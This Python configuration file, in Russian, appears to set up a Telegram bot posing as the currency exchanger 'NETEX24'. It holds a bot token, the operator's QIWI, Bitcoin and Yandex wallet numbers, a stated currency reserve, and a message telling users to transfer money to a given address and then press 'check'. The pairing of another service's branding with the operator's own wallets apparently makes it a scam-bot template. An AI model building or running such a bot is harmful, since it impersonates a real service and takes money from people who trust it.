import random
token = '815289397:AAE1faffnBMIvvpm-8L4ULYuYeUolLXLdVg' #Ваш токек
ID = 767832724 #Вашь телеграм айди
QIWI = '+79513572342'
BTC = '17sbmwgtErN8Tr1Qb6b5XeBLnjJRZskpzt'
YANDEX = '410015284103549'
#===================
text = '''
Вас приветствует 💰NETEX24💰 - 24\\7
Самый надежный Online Обменник
➖➖➖➖➖➖➖➖➖➖➖➖➖
Здесь Вы можете:
⇝ Обменивать валюту 24\\7
⇝ связаться с оператором по всем вопросам
⇝ Отзывы www.bestchange.ru/netex24-exchanger.html
⇝ Сайт netex24.net
➖➖➖➖➖➖➖➖➖➖➖➖➖
✓ Связь с Оператором:
✉️ @netex24_support
⏱ 10:00 - 23:00
➖➖➖➖➖➖➖➖➖➖➖➖➖
❗️ Моментальный обмен средств ❗️
➖➖➖➖➖➖➖➖➖➖➖➖➖'''
#=========================
inf = ''' 
💳Наш резерв💳
BTC - 13.5236
QIWI- 963.566 RUB
YANDEX - 1.468.690 RUB'''
#=====================
contact = ''' 
➖➖➖➖➖➖➖➖➖➖➖➖➖
✓ Связь с Оператором:
✉️ @netex24_support
⏱ 10:00 - 23:00
➖➖➖➖➖➖➖➖➖➖➖➖➖'''
#=========================
text_for_payment = ''' 
Заказ №{1} добавлен в обработку.\n \nСовершите перевод на: {0} \n💰Далее нажмите на кнопку проверить💰'''